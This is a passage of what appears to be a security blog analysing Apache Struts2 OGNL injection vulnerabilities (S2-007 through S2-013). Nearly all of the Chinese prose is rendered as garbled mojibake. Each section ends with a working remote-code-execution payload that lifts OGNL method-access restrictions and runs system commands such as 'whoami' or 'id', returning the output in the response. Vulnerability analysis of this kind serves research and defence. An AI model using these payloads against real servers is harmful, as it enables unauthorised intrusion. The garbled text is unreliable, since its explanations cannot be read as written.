src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111455764.png"></li><li>å¯ä»¥çœ‹åˆ°æ­¤å¤„çš„æ­£åˆ™è¡¨è¾¾å¼åªæ˜¯ç®€å•çš„å¯¹#è¿›è¡Œäº†è¿‡æ»¤å¹¶æ²¡æœ‰è¿‡æ»¤unicodeå­—ç¬¦ï¼Œæœ€ç»ˆæ‰§è¡Œç»“æŸè¿”å›å­—ç¬¦ä¸²ä½¿å¾—åˆ¤å®šä¸ºçœŸ<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111501736.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111459231.png"></li><li>ä¸‹ä¸€æ­¥ç»§ç»­è·Ÿè¿›stackçš„setValueæ–¹æ³•<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111556550.png"></li><li>å‘ç°å…¶åˆè°ƒç”¨äº†åŒåçš„é‡è½½æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿›<code>OgnlUtil.setValue</code><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111605549.png"></li><li>è·Ÿå…¥compileæ–¹æ³•ï¼Œç»§ç»­è·Ÿå…¥parseExpressionæ–¹æ³•ï¼Œç»§ç»­è·Ÿå…¥topLevelExpressionæ–¹æ³•ï¼Œç»§ç»­è¿›å…¥expressionï¼Œç»è¿‡ä¸€ç³»åˆ—æ“ä½œåæœ€ç»ˆè§£æåˆ°<code>ognl.JavaCharStream#readChar</code>å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œ<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111607140.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111610477.png"></li><li>å¯ä»¥çœ‹åˆ°å…¶å¯¹\uç±»å‹çš„å­—ç¬¦è¿›è¡Œäº†ä¸“é—¨çš„è§£æï¼Œå°†å…¶è½¬åŒ–ä¸ºæ­£å¸¸å­—ç¬¦ï¼Œå¯¼è‡´OGNLè¡¨è¾¾å¼æ‰§è¡Œ<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209111615029.png"></li></ol><h2 id="281"><a href="#281" class="headerlink" title="281"></a>281</h2><p>æ¼æ´ï¼šS2-007 <em>CVE-2012-0838</em></p><p>æ¼æ´æˆå› ï¼šåœ¨Struts2ä¸­,å¯ä»¥å°†HTTPè¯·æ±‚æ•°æ®æ³¨å…¥åˆ°å®é™…ä¸šåŠ¡Actionçš„å±æ€§ä¸­,è¿™äº›å±æ€§å¯ä»¥æ˜¯ä»»æ„ç±»å‹çš„æ•°æ®,é€šè¿‡HTTPåªèƒ½è·å–åˆ°Stringç±»å‹æ•°æ®,Struts2ä¸­é»˜è®¤æœ‰ä¸€ä¸ªç±»å‹è½¬æ¢å™¨,å¯ä»¥å®Œæˆå¤§éƒ¨åˆ†çš„è‡ªåŠ¨è½¬æ¢æ“ä½œ,å¯ä»¥é€šè¿‡xmlæ–‡ä»¶,æ¥å®šä¹‰è½¬æ¢è§„åˆ™.æ¯”å¦‚Actionç±»ä¸­æœ‰ä¸€ä¸ªintegerå±æ€§,ä¸éœ€è¦æ‰§è¡Œä»»ä½•æ“ä½œ,Strutsä¼šè‡ªåŠ¨å°†è¯·æ±‚å‚æ•°è½¬æ¢ä¸ºintegerå±æ€§.å½“é…ç½®äº†Validationæ—¶,è‹¥ç±»å‹è½¬æ¢å‡ºé”™,åç«¯é»˜è®¤ä¼šå°†ç”¨æˆ·æäº¤çš„è¡¨å•å€¼é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥,ç„¶åæ‰§è¡Œä¸€æ¬¡OGNLè¡¨è¾¾å¼è§£æå¹¶è¿”å›,ä»è€Œå¯ä»¥æ„é€ ç‰¹æ®Šçš„æ¶æ„è¯·æ±‚æ¥æ‰§è¡Œå‘½ä»¤.è¿™ç§åˆ©ç”¨æ–¹å¼å’ŒS2-001çš„å¾ˆç›¸ä¼¼,ä¸åŒçš„æ˜¯åˆ©ç”¨ç‚¹ä¸åŒ.</p><p>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.2.3</p><p>æ¼æ´åˆ†æï¼š</p><ol><li>é¦–å…ˆçœ‹demoä¸­å¯¹Struts2çš„é»˜è®¤ç±»å‹è½¬æ¢å™¨çš„è°ƒç”¨ï¼Œå…¶é€šè¿‡xmlæ–‡ä»¶æ¥å®šä¹‰è½¬æ¢è§„åˆ™ï¼Œåœ¨ç¯å¢ƒç»™äºˆçš„demoä¸­å°±å°†ageè½¬æ¢ä¸ºintç±»å‹ï¼ŒèŒƒå›´åœ¨1-100<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141518983.png"></li><li>å…·ä½“æ¼æ´è§¦å‘ç‚¹å°±åœ¨<code>com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor</code>ä¸­ï¼Œå…ˆåœ¨å¯¹åº”ä½ç½®æ‰“å¥½æ–­ç‚¹ï¼Œç„¶åå‘èµ·è¯·æ±‚ï¼Œå°†payloadæ”¾å…¥<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141522934.png"></li><li>å¯ä»¥çœ‹åˆ°æ­¤å¤„çš„ä»£ç å°†è½¬æ¢å‡ºé—®é¢˜çš„å†…å®¹æ”¾å…¥äº†<code>conversionErrors</code>å˜é‡ä¸­ï¼Œå¹¶åœ¨i$è¿­ä»£å™¨ä¸­å¾ªç¯å°†å±æ€§åèµ‹å€¼ç»™propertyNameï¼Œå±æ€§å€¼èµ‹å€¼ç»™value<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141530747.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141534846.png"></li><li>æœ€åå¯¹fakieè¿›è¡Œçš„putæ“ä½œï¼Œæˆ‘ä»¬è·Ÿè¿›<code>getOverrideExpr</code>æ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°å¯¹valueè¿›è¡Œå¤„ç†æ—¶å¯¹å­—ç¬¦ä¸²å‰ååˆ†åˆ«æ·»åŠ äº†ä¸€ä¸ªå•å¼•å·ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬çš„payloadæ˜¯è¿™ç§æ ¼å¼çš„åŸå› ï¼Œ<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141539863.png"></li><li>æœ€ç»ˆèµ°å…¥OgnlValueStackçš„setExprOverridesæ–¹æ³•ï¼Œå°†fakieèµ‹å€¼ç»™overrideså±æ€§<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141547096.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209141545456.png"></li><li>å½“æ‹¦æˆªå™¨æ‰§è¡Œç»“æŸåä¼šå°†jspå†…å®¹è¿›è¡Œè§£æï¼Œä¼šä»OgnlValueStackçš„overrideså±æ€§ä¸­å¯»æ‰¾keyä¸ºageçš„é”®å€¼å¯¹å¹¶æ‰§è¡Œognlè¡¨è¾¾å¼</li></ol><p>payload:</p><pre class="line-numbers language-none"><code class="language-none">&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]&#x3D;true,#foo&#x3D;new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]&#x3D;#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;id&#39;).getInputStream())) + &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="282"><a href="#282" class="headerlink" title="282"></a>282</h2><p>æ¼æ´ï¼šS2-008 <em>CVE-2012-0391</em></p><p>æ¼æ´æˆå› ï¼šStruts2æ¡†æ¶å­˜åœ¨ä¸€ä¸ªdevmodeæ¨¡å¼,å½“devmodeæ¨¡å¼å¼€å¯æ—¶,Struts2å¯¹ä¼ å…¥çš„å‚æ•°æ²¡æœ‰ä¸¥æ ¼é™åˆ¶,å¯¼è‡´å¤šä¸ªåœ°æ–¹å¯ä»¥æ‰§è¡Œæ¶æ„ä»£ç </p><p>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.17</p><p>æ¼æ´åˆ†æï¼š</p><ol><li>é¦–å…ˆçœ‹å‡ºå‘ç‚¹ä½ç½®åœ¨<code>org.apache.struts2.interceptor.debugging.DebuggingInterceptor</code>ï¼Œåœ¨ç¬¬95è¡Œå¤„æ‰“æ–­ç‚¹ï¼Œè·å–åˆ°debugçš„å€¼ä¸ºcommandï¼Œè¿›å…¥else ifçš„åˆ¤æ–­ï¼ŒæŸ¥çœ‹å†…å®¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100057285.png"></li><li>å¯ä»¥çœ‹åˆ°è¿›å…¥äº†else ifçš„åˆ¤æ–­åå°†expressionä¼ å…¥å‚æ•°çš„å€¼åœ¨138è¡Œäº¤ç»™äº†cmdï¼Œåˆåœ¨145è¡Œé€šè¿‡<code>stack.findValue</code>æ‰§è¡Œäº†OGNLè¡¨è¾¾å¼å¹¶å°†å›æ˜¾å†…å®¹å†™å…¥é¡µé¢<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209100101557.png"></li></ol><p>æ¼æ´ä¿®å¤ï¼šåœ¨ä¹‹åçš„ç‰ˆæœ¬ä¸­ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥é˜²æ­¢å†…å®¹æ‰§è¡Œ</p><p>Payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">?debug&#x3D;command&amp;expression&#x3D;%28%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28&quot;false&quot;%29%20%2C%23context%5B&quot;xwork.MethodAccessor.denyMethodExecution&quot;%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="283"><a href="#283" class="headerlink" title="283"></a>283</h2><p>æ¼æ´ï¼šS2-009 <em>CVE-2011-3923</em></p><p>æ¼æ´æˆå› ï¼šStruts2æ¡†æ¶ä¸­ParametersInterceptoræ‹¦æˆªå™¨åªæ£€æŸ¥ä¼ å…¥çš„å‚æ•°åæ˜¯å¦åˆæ³•,ä¸ä¼šæ£€æŸ¥å‚æ•°å€¼ï¼Œä¾‹å¦‚ä¼ å…¥å‚æ•°<code>top[&#39;foo&#39;](0)</code>ä¼šé€šè¿‡ParametersInterceptorçš„ç™½åå•æ£€æŸ¥,OGNLä¼šå°†å…¶è§£æä¸º(top[â€˜fooâ€™])(0),å¹¶å°†fooçš„å€¼ä¹Ÿä½œä¸ºOGNLè¡¨è¾¾å¼è¿›è¡Œè®¡ç®—ä»è€Œé€ æˆä»£ç æ‰§è¡Œ</p><p>å…¶å®è¿™ä¸ªæ¼æ´æ˜¯å¯¹S2-003å’ŒS2-005æ¼æ´çš„ç»•è¿‡.S2-003çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢#å·ï¼Œäºæ˜¯S2-005é€šè¿‡ä½¿ç”¨#å·çš„unicodeç¼–ç \u0023æˆ–8è¿›åˆ¶ç¼–ç \43æ¥ç»•è¿‡ï¼ŒStruts2å¯¹S2-005çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢\ç­‰ç‰¹æ®Šç¬¦å·ï¼Œè¿™æ¬¡æ˜¯é€šè¿‡Struts2æ¡†æ¶ä¸­ParametersInterceptoræ‹¦æˆªå™¨åªæ£€æŸ¥ä¼ å…¥çš„å‚æ•°åè€Œä¸æ£€æŸ¥å‚æ•°å€¼çš„æ–¹å¼è¿›è¡Œæ„é€ OGNLè¡¨è¾¾å¼ä»è€Œé€ æˆä»£ç æ‰§è¡Œ</p><p>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.1</p><p>æ¼æ´åˆ†æï¼š</p><ol><li>æµç¨‹ä¸S2-005åŸºæœ¬ç›¸åŒï¼Œè·³è¿‡åˆ†æï¼Œç›´æ¥åˆ†æpayload</li><li>å½“æœ‰å½¢ä¼¼(one)(two)çš„å˜é‡æ—¶ï¼Œoneä¼šè¢«å½“ä½œä¸€ä¸ªOGNLè¡¨è¾¾å¼å»è®¡ç®—ï¼Œç„¶åæŠŠå®ƒçš„ç»“æœå½“ä½œå¦ä¸€ä¸ªä»¥twoä¸ºæ ¹å¯¹è±¡çš„OGNLè¡¨è¾¾å¼å†ä¸€æ¬¡è®¡ç®—ï¼Œæ‰€ä»¥ï¼Œå¦‚æœoneæœ‰è¿”å›å†…å®¹ï¼Œé‚£ä¹ˆè¿™äº›å†…å®¹å°†ä¼šè¢«å½“ä½œOGNLè¯­å¥è¢«è®¡ç®—ï¼Œè€Œpayloadç»“å°¾ä¼ å…¥çš„<code>z[(name)(%27meh%27)]</code>å°±æ˜¯ä¸ºäº†æŠŠnameå‚æ•°çš„å€¼å½“ä½œOGNLè¡¨è¾¾å¼è®¡ç®—</li></ol><p>payloadï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">?</span>age<span class="token operator">=</span><span class="token number">12313</span><span class="token operator">&amp;</span>name<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23</span>context<span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">22</span>xwork<span class="token punctuation">.</span>MethodAccessor<span class="token punctuation">.</span>denyMethodExecution<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">+</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Boolean</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">+</span><span class="token operator">%</span><span class="token number">23_</span>memberAccess<span class="token punctuation">[</span><span class="token operator">%</span><span class="token number">22</span>allowStaticMethodAccess<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token operator">+</span><span class="token operator">%</span><span class="token number">23</span>a<span class="token operator">=</span><span class="token annotation punctuation">@java.lang.Runtime</span><span class="token annotation punctuation">@getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span>whoami<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>b<span class="token operator">=</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>InputStreamReader</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>c<span class="token operator">=</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>BufferedReader</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23d</span><span class="token operator">=</span><span class="token keyword">new</span><span class="token operator">+</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">51020</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>c<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>kxlzx<span class="token operator">=</span><span class="token annotation punctuation">@org.apache.struts2.ServletActionContext</span><span class="token annotation punctuation">@getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>kxlzx<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">23d</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span><span class="token number">23</span>kxlzx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>meh<span class="token punctuation">)</span><span class="token operator">&amp;</span>z<span class="token punctuation">[</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">27</span>meh<span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="284"><a href="#284" class="headerlink" title="284"></a>284</h2><p>æ¼æ´ï¼šS2-012 <em>CVE-2013-1965</em></p><p>æ¼æ´æˆå› ï¼šåœ¨Struts2æ¡†æ¶ä¸­ï¼Œå¦‚æœé…ç½®Actionä¸­çš„Resultæ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨${param_name}ä½œä¸ºé‡å®šå‘å˜é‡ï¼Œå½“è§¦å‘redirectç±»å‹è¿”å›æ—¶ï¼ŒStruts2ä½¿ç”¨${param_name}è·å–å…¶å€¼ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå¯¹nameå‚æ•°çš„å€¼æ‰§è¡ŒOGNLè¡¨è¾¾å¼è§£æ,ä»è€Œå¯ä»¥æ’å…¥ä»»æ„OGNLè¡¨è¾¾å¼å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</p><p>å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.3.14.2</p><p>æ¼æ´åˆ†æï¼š</p><ol><li><p>é¦–å…ˆè¿˜æ˜¯æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸­ä½¿ç”¨äº†redirectæ–¹æ³•å¹¶ä¸”è¿”å›å€¼ä¸­ä½¿ç”¨äº†${name}å–å€¼ï¼Œå­˜åœ¨æ¼æ´è§¦å‘æ¡ä»¶<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142228174.png"></p></li><li><p>åœ¨<code>com.opensymphony.xwork2.DefaultActionInvocation</code>ç±»ä¸­æ‰“æ–­ç‚¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142230130.png"></p></li><li><p>æ­¥å…¥æ–¹æ³•ï¼ŒcreateResultæ–¹æ³•ä¼šæ ¹æ®actionçš„è¿”å›å€¼è·å–å¯¹åº”çš„resultæ ‡ç­¾é…ç½®ï¼Œç„¶åä¼ å…¥åˆ°buildResultæ–¹æ³•ä¸­ï¼Œè¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯ç”Ÿæˆå¯¹åº”çš„Resultå®ç°ç±»ï¼Œä¹Ÿå°±æ˜¯<code>org.apache.struts2.dispatcher.ServletRedirectResult</code>ç±»ï¼Œå¹¶æŠŠå¯¹åº” resultæ ‡ç­¾çš„å€¼/index.jsp?name=${name}è®¾ç½®ç»™ServletRedirectResult ç±»çš„locationå±æ€§ï¼Œç„¶åè¿”å›ServletRedirectResult<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142322880.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142322785.png"></p></li><li><p>ç„¶åè¿”å›åˆ°executeResultæ–¹æ³•ä¸­ç»§ç»­æ‰§è¡Œï¼Œè¿›å…¥åˆ°<code>this.result.execute</code>ä¸­ï¼ŒæŸ¥çœ‹resultå°±æ˜¯ServletRedirectResultç±»å‹ï¼Œæ­¥å…¥å‘ç°å…¶æ‰§è¡Œäº†superçš„executeæ–¹æ³•ï¼Œç»§ç»­è·Ÿå…¥conditionalParseæ–¹æ³•ï¼Œå‘ç°å…¶æ‰§è¡Œäº†S2-001ä¸­åŒåå…³é”®æ–¹æ³•translateVariablesï¼Œå¹¶ä¸”é€šè¿‡é‡è½½èƒ½çœ‹åˆ°é™åˆ¶äº†å¾ªç¯æ¬¡æ•°æœ€é«˜ä¸º1ï¼Œè¿™å°±æ˜¯å¯¹S2-001çš„æ¼æ´ä¿®å¤<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142328950.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142334539.png"></p></li><li><blockquote><p>å¯¹äºS2-001æ¼æ´,å®˜æ–¹è®¾ç½®äº†å¾ªç¯æ¬¡æ•°,ä»è€Œé™åˆ¶æ¶æ„ä»£ç ,ä½†è¿™ä¸ªè®¾ç½®çš„å¾ªç¯æ¬¡æ•°æ˜¯é’ˆå¯¹çš„whileå¾ªç¯,åœ¨å¤–é¢è¿˜æœ‰ä¸€ä¸ªforå¾ªç¯,forå¾ªç¯å¼€å§‹çš„poså‚æ•°ç”¨æ¥è·å–expressionè¡¨è¾¾å¼çš„å¼€å§‹ä½ç½®,æ¯”å¦‚è§£æå®Œäº†%{password}çš„å€¼,ä¸‹ä¸€æ¬¡è§£ææ˜¯ä»%{password}åé¢å¼€å§‹.åœ¨S2-001çš„ä¿®å¤ä¸­å®ƒè¢«æ”¾åœ¨äº†forå¾ªç¯é‡Œ,å¯¼è‡´ç¬¬äºŒæ¬¡forå¾ªç¯æ—¶posçš„å€¼ä¼šè¢«é‡ç½®ä¸º0.ä»è€Œåˆä»å¤´å¼€å§‹è§£æ.ä»ä¸‹å›¾ä¸­çš„å˜é‡å€¼å¯ä»¥çœ‹åˆ°forè¿›è¡Œäº†2æ¬¡å¾ªç¯,å¾ªç¯2æ¬¡æ˜¯å› ä¸ºä¼ å…¥çš„å‚æ•°new char[]{â€˜$â€™, â€˜%â€™}é•¿åº¦ä¸º2å¯¼è‡´çš„.forç¬¬äºŒæ¬¡å¾ªç¯æ—¶openä¸ºarræ•°ç»„çš„ç¬¬äºŒä¸ªå‚æ•°%,è¿™ä¸ª%å’Œ{ç»„åˆååˆæˆäº†S2-001çš„åˆ©ç”¨æ‰€éœ€è¦çš„æ¡ä»¶,æœ€åè¿˜æ˜¯é€šè¿‡whileå¾ªç¯ä¸­çš„stack.findValueæ¥è¿›è¡Œæ‰§è¡Œä»£ç çš„.S2-001ä¿®å¤æ–¹æ¡ˆä¸­çš„å¢åŠ loopCountå˜é‡é™åˆ¶äº†whileå¾ªç¯çš„æ¬¡æ•°,å´æ²¡æœ‰é™åˆ¶forå¾ªç¯çš„æ¬¡æ•°,æ¯æ¬¡forå¾ªç¯å¼€å§‹æ—¶loopCountéƒ½ä¼šè¢«é‡ç½®ä¸º1.</p></blockquote><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209142337790.png"></p></li></ol><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="285"><a href="#285" class="headerlink" title="285"></a>285</h2><p>æ¼æ´ï¼šS2-013 <em>CVE-2013-1966</em></p><p>æ¼æ´æˆå› ï¼šåœ¨Struts2æ ‡ç­¾ä¸­å’Œéƒ½åŒ…å«ä¸€ä¸ªincludeParamså±æ€§ï¼Œå…¶å€¼å¯è®¾ç½®ä¸ºnoneã€get æˆ– allï¼Œå…¶å¯¹åº”æ„ä¹‰åˆ†åˆ«ä¸ºï¼šnone:é“¾æ¥ä¸åŒ…å«è¯·æ±‚çš„ä»»æ„å‚æ•°å€¼(é»˜è®¤)ï¼Œget:é“¾æ¥åªåŒ…å«GETè¯·æ±‚ä¸­çš„å‚æ•°å’Œå…¶å€¼ï¼Œall:é“¾æ¥åŒ…å«GETå’ŒPOSTæ‰€æœ‰å‚æ•°å’Œå…¶å€¼ï¼Œç”¨æ¥æ˜¾ç¤ºä¸€ä¸ªè¶…é“¾æ¥,å½“includeParams=allçš„æ—¶å€™ï¼Œä¼šå°†æœ¬æ¬¡è¯·æ±‚çš„GETå’ŒPOSTå‚æ•°éƒ½æ”¾åœ¨URLçš„GETå‚æ•°ä¸Šï¼Œè¿™ä¸ªå‚æ•°ä¼šè¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æï¼Œä»è€Œå¯ä»¥æ’å…¥ä»»æ„OGNLè¡¨è¾¾å¼å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œ</p><p>å½±å“ç‰ˆæœ¬ï¼š<em>Struts 2.0.0 - Struts 2.3.14.1</em></p><p>æ¼æ´åˆ†æï¼š</p><ol><li>çœ‹é…ç½®æ–‡ä»¶ï¼ŒincludeParamså±æ€§ä¸ºall<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209150147876.png"></li><li><code>org.apache.struts2.components.ComponentUrlProvider</code>æ‰“æ–­ç‚¹<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209150209394.png"></li><li>è·Ÿå…¥beforeRenderUrlå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è·å–äº†urlæ‰€ä¼ é€’çš„å‚æ•°å¯ä»¥çœ‹åˆ°includeParamså‚æ•°ä¸ºallï¼Œæ­¤å¤„çš„mergeRequestParametersè·å–åˆ°äº†urlä¸­ä¼ é€’çš„å‚æ•°<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209151820358.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161613470.png"></li><li>æ­¥è¿‡æ‰§è¡Œç›´åˆ°endå‡½æ•°ï¼Œç»§ç»­æ­¥å…¥renderUrlå‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬èƒ½çœ‹åˆ°æˆ‘ä»¬çš„payloadå·²ç»è¢«æ”¾å…¥åˆ°äº†urlComponentçš„paramterså±æ€§ä¸­ï¼Œç»§ç»­è·Ÿå…¥determineActionURLå‡½æ•°<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161706306.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161709860.png"></li><li>è¿›å…¥åˆ°é‡è½½å‡½æ•°determineActionURLï¼Œæ‰§è¡Œåˆ°æœ€åå‘ç°æˆ‘ä»¬payloadå‰åŠæ®µå·²ç»è¢«è¢«æ‰§è¡Œï¼ŒactionMapperä¸­çš„allowDynamicMethodCallså±æ€§å·²ç»å˜ä¸ºtrueï¼Œç»§ç»­è·Ÿå…¥buildUrlæ–¹æ³•<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161712049.png"></li><li>æ­¥è¿‡åˆ°buildParametersStringï¼Œæ­¥å…¥è¯¥å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥çš„urlå’Œå‚æ•°è¢«ä¼ å…¥å…¶ä¸­<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161714673.png"></li><li>è¿›å…¥åˆ°é‡è½½æ–¹æ³•ä¸­ï¼Œæ‰§è¡Œç›´åˆ°166è¡ŒbuildParameterSubstringå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„payloadå·²ç»è¢«ä¼ å…¥å…¶ä¸­<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161717072.png"></li><li>ç»§ç»­è·Ÿå…¥translateAndEncodeå‡½æ•°ï¼Œè·Ÿå…¥translateVariableå‡½æ•°ï¼Œå¯ä»¥å‘ç°valueStackå‡ºç°äº†<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161718405.png"><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161719376.png"></li><li>ç»§ç»­è·Ÿå…¥å°±æ˜¯translateVariableså‡½æ•°äº†ï¼ŒOGNLè¡¨è¾¾å¼åœ¨è¿™é‡Œè¢«æ‰§è¡Œ<img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202209161720361.png"></li></ol><p>payloadï¼š</p><pre class="line-numbers language-none"><code class="language-none">?a&#x3D;%24%7B%23_memberAccess%5B&quot;allowStaticMethodAccess&quot;%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27whoami%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%27dbapp%3D%27%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" 